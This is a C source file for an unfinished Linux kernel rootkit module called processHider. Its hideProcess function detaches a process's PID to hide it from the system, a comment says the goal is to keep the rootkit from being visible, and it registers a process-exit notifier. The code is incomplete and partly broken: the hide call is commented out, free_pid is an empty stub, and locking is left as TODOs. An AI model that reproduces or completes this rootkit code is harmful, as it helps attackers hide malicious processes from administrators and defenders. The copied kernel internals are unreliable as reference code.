#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>

#include "messagesToUser.h"
#include "processHider.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif



//#include "doExitHijack.h"


// prototypes for functions from pid.c
static void __change_pid(struct task_struct *task, enum pid_type type, struct pid *new);
void detach_pid(struct task_struct *task, enum pid_type type);
void change_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid);
void free_pid(struct pid *pid);
static int hideProcess(int pidNumber);


int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	printInfo("in notification function for exit :)\n");
	return 0;
}
struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunction,
	.next = NULL,// TODO: CHECK THIS
	.priority = 1, // TODO: CHECK THIS
};


int processHider_init(void) {
	//TODO: only hide proccess when wanted ...
	//pid_t pid = 2404; //TODO: change this 
	//hideProcess(pid); // todo: perhaps use result of function call..
	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues

	//replacement_do_exit(0);

	//TODO: check value returned..

	// this will fail if profiling is disabled
	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		return error;
	}



	return 0;
}


void processHider_exit(void) {
	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
		// alternatively kill them / require that the tasks are dead first..

	//TODO: ensure code is not in notifier when exit is progress / going to be called..
	int error;
	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
}


//returns error code...
static int hideProcess(int pidNumber) {
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
	if (pid == NULL) {
		return 1;
	}
	
	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
	
	{
		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
		
		detach_pid(task, PIDTYPE_PID);
	}
	
	rcu_read_unlock();
	
	//todo release lock..
	
	printInfo("pid points to %p\n", pid); // TODO: print time etc..
	
	return 0;
}


//from linux kernel... version... pid.c

void attach_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid)
{
	struct pid_link *link;

	link = &task->pids[type];
	link->pid = pid;
	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
}




static void __change_pid(struct task_struct *task, enum pid_type type,
			struct pid *new)
{
	struct pid_link *link;
	struct pid *pid;
	int tmp;

	link = &task->pids[type];
	pid = link->pid;

	hlist_del_rcu(&link->node);
	link->pid = new;

	for (tmp = PIDTYPE_MAX; --tmp >= 0; )
		if (!hlist_empty(&pid->tasks[tmp]))
			return;

	free_pid(pid);
}

void detach_pid(struct task_struct *task, enum pid_type type)
{
	__change_pid(task, type, NULL);
}

void change_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid)
{
	__change_pid(task, type, pid);
	attach_pid(task, type, pid);
}


void free_pid(struct pid *pid) {
	//TODO: copy this from pid.c / fill in dependancies etc..

}
